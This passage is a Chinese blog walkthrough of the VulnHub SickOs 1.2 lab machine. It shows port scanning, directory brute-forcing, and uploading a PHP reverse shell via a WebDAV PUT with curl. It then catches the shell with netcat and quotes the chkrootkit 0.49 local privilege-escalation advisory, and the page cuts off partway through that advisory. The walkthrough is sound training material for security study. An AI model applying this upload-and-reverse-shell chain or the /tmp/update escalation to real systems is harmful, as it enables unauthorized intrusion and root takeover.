@@ -1,0 +1,601 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=&#34;auto&#34;>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/favicon.png">
+  <link rel="icon" href="/img/favicon.png">
+  <meta name="viewport"
+        content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="description" content="">
+  <meta name="author" content="John Doe">
+  <meta name="keywords" content="">
+  
+  <title>SickOs：1.2 - Knight&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
+
+
+  <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/github-markdown-css@4.0.0/github-markdown.min.css" />
+  <link  rel="stylesheet" href="/lib/hint/hint.min.css" />
+
+  
+    
+    
+      
+      <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/highlight.js@10.7.2/styles/github-gist.min.css" />
+    
+  
+
+  
+    <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css" />
+  
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_ba1fz6golrf.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_kmeydafke9r.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+<!-- 自定义样式保持在最底部 -->
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    var CONFIG = {"hostname":"example.com","root":"/","version":"1.8.11","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"right","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"copy_btn":true,"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"baidu":null,"google":null,"gtag":null,"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null}},"search_path":"/local-search.xml"};
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+<body>
+  <header style="height: 70vh;">
+    <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand"
+       href="/">&nbsp;<strong>Knight's Blog</strong>&nbsp;</a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                首页
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                归档
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                分类
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                标签
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                关于
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" data-toggle="modal" data-target="#modalSearch">&nbsp;<i
+                class="iconfont icon-search"></i>&nbsp;</a>
+          </li>
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self">&nbsp;<i
+                class="iconfont icon-dark" id="color-toggle-icon"></i>&nbsp;</a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+    <div class="banner" id="banner" parallax=true
+         style="background: url('/img/post.png') no-repeat center center;
+           background-size: cover;">
+      <div class="full-bg-img">
+        <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+          <div class="page-header text-center fade-in-up">
+            <span class="h2" id="subtitle" title="SickOs：1.2">
+              
+            </span>
+
+            
+              <div class="mt-3">
+  
+  
+    <span class="post-meta">
+      <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+      <time datetime="2022-07-04 00:00" pubdate>
+        2022年7月4日 凌晨
+      </time>
+    </span>
+  
+</div>
+
+<div class="mt-1">
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-chart"></i>
+      4.9k 字
+    </span>
+  
+
+  
+    
+    <span class="post-meta mr-2">
+      <i class="iconfont icon-clock-fill"></i>
+      
+      
+      83
+       分钟
+    </span>
+  
+
+  
+  
+</div>
+
+            
+          </div>
+
+          
+        </div>
+      </div>
+    </div>
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="d-none d-lg-block col-lg-2"></div>
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div class="py-5" id="board">
+          <article class="post-content mx-auto">
+            <!-- SEO header -->
+            <h1 style="display: none">SickOs：1.2</h1>
+            
+            <div class="markdown-body">
+              <h1 id="0x0D-SickOs-1-2-vulnhub"><a href="#0x0D-SickOs-1-2-vulnhub" class="headerlink" title="0x0D SickOs: 1.2~vulnhub"></a>0x0D SickOs: 1.2~vulnhub</h1><blockquote>
+<p>靶机地址：<a target="_blank" rel="noopener" href="https://www.vulnhub.com/entry/sickos-12,144/">SickOs: 1.2 ~ VulnHub</a></p>
+<p>环境信息：</p>
+<ul>
+<li>攻击机 IP：192.168.135.141</li>
+<li>靶机 IP：192.168.135.154</li>
+</ul>
+</blockquote>
+<h2 id="一、信息收集"><a href="#一、信息收集" class="headerlink" title="一、信息收集"></a>一、信息收集</h2><h3 id="1、主机探测"><a href="#1、主机探测" class="headerlink" title="1、主机探测"></a>1、主机探测</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nmap -sn 192.168.135.0/24</span><br></code></pre></td></tr></table></figure>
+<p><strong>得到靶机 ip：192.168.135.154</strong></p>
+<h3 id="2、端口扫描"><a href="#2、端口扫描" class="headerlink" title="2、端口扫描"></a>2、端口扫描</h3><p><strong>nmap 命令：</strong></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> sudo nmap -sS -A -p- 192.168.135.154</span><br>[sudo] password for kali: <br>Starting Nmap 7.91 ( https://nmap.org ) at 2022-07-04 04:16 EDT<br>Nmap scan report for 192.168.135.154 (192.168.135.154)<br>Host is up (0.00097s latency).<br>Not shown: 65533 filtered ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)<br>| ssh-hostkey: <br>|   1024 66:8c:c0:f2:85:7c:6c:c0:f6:ab:7d:48:04:81:c2:d4 (DSA)<br>|   2048 ba:86:f5:ee:cc:83:df:a6:3f:fd:c1:34:bb:7e:62:ab (RSA)<br>|_  256 a1:6c:fa:18:da:57:1d:33:2c:52:e4:ec:97:e2:9e:af (ECDSA)<br>80/tcp open  http    lighttpd 1.4.28<br>|_http-server-header: lighttpd/1.4.28<br>|_http-title: Site doesn&#x27;t have a title (text/html).<br>MAC Address: 00:0C:29:7C:BD:F7 (VMware)<br>Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port<br>Device type: general purpose<br>Running: Linux 3.X|4.X<br>OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4<br>OS details: Linux 3.10 - 4.11, Linux 3.2 - 4.9<br>Network Distance: 1 hop<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel<br><br>TRACEROUTE<br>HOP RTT     ADDRESS<br>1   0.97 ms 192.168.135.154 (192.168.135.154)<br><br>Nmap done: 1 IP address (1 host up) scanned in 113.75 seconds<br></code></pre></td></tr></table></figure>
+<p><strong>得到目标端口信息：</strong></p>
+<div class="table-container">
+<table>
+<thead>
+<tr>
+<th>PORT</th>
+<th>STATE</th>
+<th>SERVICE</th>
+<th>VERSION</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>22/tcp</td>
+<td>open</td>
+<td>ssh</td>
+<td>OpenSSH 5.9p1 Debian 5ubuntu1.8 (Ubuntu Linux; protocol 2.0)</td>
+</tr>
+<tr>
+<td>80/tcp</td>
+<td>open</td>
+<td>http</td>
+<td>lighttpd 1.4.28</td>
+</tr>
+</tbody>
+</table>
+</div>
+<h3 id="3、端口探测"><a href="#3、端口探测" class="headerlink" title="3、端口探测"></a>3、端口探测</h3><p><strong>22端口</strong></p>
+<p>暂时未得到 username 和 password 的相关信息，无法使用 ssh</p>
+<p><strong>80端口</strong></p>
+<p>访问发现只有一张图片，其他什么都没有，进行目录爆破，得到 test 目录：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> dirb http://192.168.135.154</span><br><br>-----------------<br>URL_BASE: http://192.168.135.154/<br>WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt<br>-----------------<br><br>---- Scanning URL: http://192.168.135.154/ ----<br>+ http://192.168.135.154/index.php (CODE:200|SIZE:163)<br>==&gt; DIRECTORY: http://192.168.135.154/test/                                                                 <br></code></pre></td></tr></table></figure>
+<p>访问 <code>http://192.168.135.154/test/</code> ，发现是个空目录。</p>
+<h2 id="二、权限获取"><a href="#二、权限获取" class="headerlink" title="二、权限获取"></a>二、权限获取</h2><p>查找 lighttpd 漏洞：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit lighttpd</span><br></code></pre></td></tr></table></figure>
+<p>发现没有可用的，看来还是要把切入点放在扫出来的目录上 。</p>
+<p>尝试使用 POST 方式上传文件和数据，都没有成功。</p>
+<p>使用 curl 探测一下 test 目录可用的 http 方法：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -X OPTIONS http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> OPTIONS /<span class="hljs-built_in">test</span>/ HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 200 OK<br>&lt; DAV: 1,2<br>&lt; MS-Author-Via: DAV<br>&lt; Allow: PROPFIND, DELETE, MKCOL, PUT, MOVE, COPY, PROPPATCH, LOCK, UNLOCK<br>&lt; Allow: OPTIONS, GET, HEAD, POST<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 16:29:47 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br></code></pre></td></tr></table></figure>
+<p>发现可以用 put 作为请求方式，尝试上传文件：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -T php-reverse-shell.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/php-reverse-shell.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 5497</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Expect: 100-continue</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 417 Expectation Failed<br>&lt; Content-Type: text/html<br>&lt; Content-Length: 363<br>&lt; Connection: close<br>&lt; Date: Mon, 04 Jul 2022 17:35:25 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>&lt;?xml version=&quot;1.0&quot; encoding=&quot;iso-8859-1&quot;?&gt;<br>&lt;!DOCTYPE html PUBLIC &quot;-//W3C//DTD XHTML 1.0 Transitional//EN&quot;<br>         &quot;http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd&quot;&gt;<br>&lt;html xmlns=&quot;http://www.w3.org/1999/xhtml&quot; xml:lang=&quot;en&quot; lang=&quot;en&quot;&gt;<br> &lt;head&gt;<br>  &lt;title&gt;417 - Expectation Failed&lt;/title&gt;<br> &lt;/head&gt;<br> &lt;body&gt;<br>  &lt;h1&gt;417 - Expectation Failed&lt;/h1&gt;<br> &lt;/body&gt;<br>&lt;/html&gt;<br>* Closing connection 0<br></code></pre></td></tr></table></figure>
+<p>由于 curl 会发送一个带 Expect 头的报文，而 lighttpd 不支持这个头，因此无法上传成功。</p>
+<p>添加头信息，将其设置为空，成功上传：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> curl -v -H <span class="hljs-string">&#x27;Expect:&#x27;</span> -T php-reverse-shell.php http://192.168.135.154/<span class="hljs-built_in">test</span>/</span><br>*   Trying 192.168.135.154:80...<br>* Connected to 192.168.135.154 (192.168.135.154) port 80 (#0)<br><span class="hljs-meta">&gt;</span><span class="bash"> PUT /<span class="hljs-built_in">test</span>/php-reverse-shell.php HTTP/1.1</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Host: 192.168.135.154</span><br><span class="hljs-meta">&gt;</span><span class="bash"> User-Agent: curl/7.83.0</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Accept: */*</span><br><span class="hljs-meta">&gt;</span><span class="bash"> Content-Length: 5497</span><br><span class="hljs-meta">&gt;</span><span class="bash"> </span><br>* We are completely uploaded and fine<br>* Mark bundle as not supporting multiuse<br>&lt; HTTP/1.1 201 Created<br>&lt; Content-Length: 0<br>&lt; Date: Mon, 04 Jul 2022 17:36:39 GMT<br>&lt; Server: lighttpd/1.4.28<br>&lt; <br>* Connection #0 to host 192.168.135.154 left intact<br></code></pre></td></tr></table></figure>
+<p>kali 监听：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 1234</span>            <br>listening on [any] 1234 ...<br><br>WARNING: Failed to daemonise. This is quite common and not fatal. Connection timed out (110)<br></code></pre></td></tr></table></figure>
+<p>一直监听不到，尝试更换端口，最后端口设为 8080 时成功监听到：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> nc -lnvp 8080</span><br>listening on [any] 8080 ...<br>connect to [192.168.135.141] from (UNKNOWN) [192.168.135.154] 49867<br>Linux ubuntu 3.11.0-15-generic #25~precise1-Ubuntu SMP Thu Jan 30 17:42:40 UTC 2014 i686 i686 i386 GNU/Linux<br> 10:44:46 up  1:47,  0 users,  load average: 0.00, 0.02, 0.05<br>USER     TTY      FROM              LOGIN@   IDLE   JCPU   PCPU WHAT<br>uid=33(www-data) gid=33(www-data) groups=33(www-data)<br>/bin/sh: 0: can&#x27;t access tty; job control turned off<br><span class="hljs-meta">$</span><span class="bash"> whoami</span><br>www-data<br></code></pre></td></tr></table></figure>
+<h2 id="三、权限提升"><a href="#三、权限提升" class="headerlink" title="三、权限提升"></a>三、权限提升</h2><p>查找 SUID：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> find / -perm -u=s -<span class="hljs-built_in">type</span> f 2&gt;/dev/null</span>                                              <br>/usr/sbin/pppd<br>/usr/sbin/uuidd<br>/usr/lib/eject/dmcrypt-get-device<br>/usr/lib/openssh/ssh-keysign<br>/usr/lib/pt_chown<br>/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper<br>/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper<br>/usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>/usr/bin/sudoedit<br>/usr/bin/traceroute6.iputils<br>/usr/bin/sudo<br>/usr/bin/chsh<br>/usr/bin/passwd<br>/usr/bin/chfn<br>/usr/bin/at<br>/usr/bin/mtr<br>/usr/bin/gpasswd<br>/usr/bin/newgrp<br>/bin/mount<br>/bin/ping6<br>/bin/fusermount<br>/bin/umount<br>/bin/ping<br>/bin/su<br></code></pre></td></tr></table></figure>
+<p>查看计划任务，发现了 Chkrootkit：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">pwd</span></span><br>/<br><span class="hljs-meta">$</span><span class="bash"> <span class="hljs-built_in">cd</span> /etc</span><br><span class="hljs-meta">$</span><span class="bash"> ls -l | grep cron</span><br>drwx------ 2 root root    4096 Apr 12  2016 cron.d<br>drwxr-xr-x 2 root root    4096 Apr 12  2016 cron.daily<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.hourly<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.monthly<br>drwxr-xr-x 2 root root    4096 Mar 30  2016 cron.weekly<br>-rw-r--r-- 1 root root     722 Jun 19  2012 crontab<br><span class="hljs-meta">$</span><span class="bash"> ls -l cron.daily</span>    <br>total 60<br>-rwxr-xr-x 1 root root 15399 Nov 15  2013 apt<br>-rwxr-xr-x 1 root root   314 Apr 18  2013 aptitude<br>-rwxr-xr-x 1 root root   502 Mar 31  2012 bsdmainutils<br>-rwxr-xr-x 1 root root  2032 Jun  4  2014 chkrootkit<br>-rwxr-xr-x 1 root root   256 Oct 14  2013 dpkg<br>-rwxr-xr-x 1 root root   338 Dec 20  2011 lighttpd<br>-rwxr-xr-x 1 root root   372 Oct  4  2011 logrotate<br>-rwxr-xr-x 1 root root  1365 Dec 28  2012 man-db<br>-rwxr-xr-x 1 root root   606 Aug 17  2011 mlocate<br>-rwxr-xr-x 1 root root   249 Sep 12  2012 passwd<br>-rwxr-xr-x 1 root root  2417 Jul  1  2011 popularity-contest<br>-rwxr-xr-x 1 root root  2947 Jun 19  2012 standard<br></code></pre></td></tr></table></figure>
+<p>查看 Chkrootkit 版本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> chkrootkit -V</span><br>chkrootkit version 0.49<br></code></pre></td></tr></table></figure>
+<p>查找利用脚本：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta">$</span><span class="bash"> searchsploit chkrootkit</span>   <br>-------------------------------------------------------------------------- ---------------------------------<br> Exploit Title                                                            |  Path<br>-------------------------------------------------------------------------- ---------------------------------<br>Chkrootkit - Local Privilege Escalation (Metasploit)                      | linux/local/38775.rb<br>Chkrootkit 0.49 - Local Privilege Escalation                              | linux/local/33899.txt<br>-------------------------------------------------------------------------- ---------------------------------<br>Shellcodes: No Results<br><span class="hljs-meta"></span><br><span class="hljs-meta">$</span><span class="bash"> cat /usr/share/exploitdb/exploits/linux/<span class="hljs-built_in">local</span>/33899.txt</span>                   <br>We just found a serious vulnerability in the chkrootkit package, which<br>may allow local attackers to gain root access to a box in certain<br>configurations (/tmp not mounted noexec).<br><br>The vulnerability is located in the function slapper() in the<br>shellscript chkrootkit:<br><span class="hljs-meta"></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-comment"># SLAPPER.&#123;A,B,C,D&#125; and the multi-platform variant</span></span><br><span class="hljs-meta">#</span><span class="bash"></span><br><span class="bash"><span class="hljs-function"><span class="hljs-title">slapper</span></span> ()&#123;</span><br>   SLAPPER_FILES=&quot;$&#123;ROOTDIR&#125;tmp/.bugtraq $&#123;ROOTDIR&#125;tmp/.bugtraq.c&quot;<br>   SLAPPER_FILES=&quot;$SLAPPER_FILES $&#123;ROOTDIR&#125;tmp/.unlock $&#123;ROOTDIR&#125;tmp/httpd \<br><span class="hljs-meta">   $</span><span class="bash">&#123;ROOTDIR&#125;tmp/update <span class="hljs-variable">$&#123;ROOTDIR&#125;</span>tmp/.cinik <span class="hljs-variable">$&#123;ROOTDIR&#125;</span>tmp/.b<span class="hljs-string">&quot;a</span></span><br>   SLAPPER_PORT=&quot;0.0:2002 |0.0:4156 |0.0:1978 |0.0:1812 |0.0:2015 &quot;<br>   OPT=-an<br>   STATUS=0<br>   file_port=<br><br>   if $&#123;netstat&#125; &quot;$&#123;OPT&#125;&quot;|$&#123;egrep&#125; &quot;^tcp&quot;|$&#123;egrep&#125; &quot;$&#123;SLAPPER_PORT&#125;&quot;&gt;<br>/dev/null 2&gt;&amp;1<br>      then<br>      STATUS=1<br>      [ &quot;$SYSTEM&quot; = &quot;Linux&quot; ] &amp;&amp; file_port=`netstat -p $&#123;OPT&#125; | \<br>         $egrep ^tcp|$egrep &quot;$&#123;SLAPPER_PORT&#125;&quot; | $&#123;awk&#125; &#x27;&#123; print  $7 &#125;&#x27; |<br>tr -d :`<br>   fi<br>   for i in $&#123;SLAPPER_FILES&#125;; do<br>      if [ -f $&#123;i&#125; ]; then<br>         file_port=$file_port $i<br>         STATUS=1<br>      fi<br>   done<br>   if [ $&#123;STATUS&#125; -eq 1 ] ;then<br>      echo &quot;Warning: Possible Slapper Worm installed ($file_port)&quot;<br>   else<br>      if [ &quot;$&#123;QUIET&#125;&quot; != &quot;t&quot; ]; then echo &quot;not infected&quot;; fi<br>         return $&#123;NOT_INFECTED&#125;<br>   fi<br>&#125;<br><br><br>The line &#x27;file_port=$file_port $i&#x27; will execute all files specified in<br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-string">SLAPPER_FILES as the user chkrootkit is running (usually root), if</span></span><br><span class="hljs-meta">$</span><span class="bash"><span class="hljs-string">file_port is empty, because of missing quotation marks around the</span></span><br>variable assignment.<br><br>Steps to reproduce:<br><br>- Put an executable file named &#x27;update&#x27; with non-root owner in /tmp (not<br>mounted noexec, obviously)<br>- Run chkrootkit (as uid 0)<br><br>Result: The file /tmp/update will be executed as root, thus effectively<br>rooting your box, if malicious content is placed inside the file.<br><br>If an attacker knows you are periodically running chkrootkit (like in<br>cron.daily) and has write access to /tmp (not mounted noexec), he may<br>easily take advantage of this.<br><br>Suggested fix: Put quotation marks around the assignment.<br><br>file_port=&quot;$file_port $i&quot;<br><br>I will also try to contact upstream, although the latest version of<br>chkrootkit dates back to 2009 - will 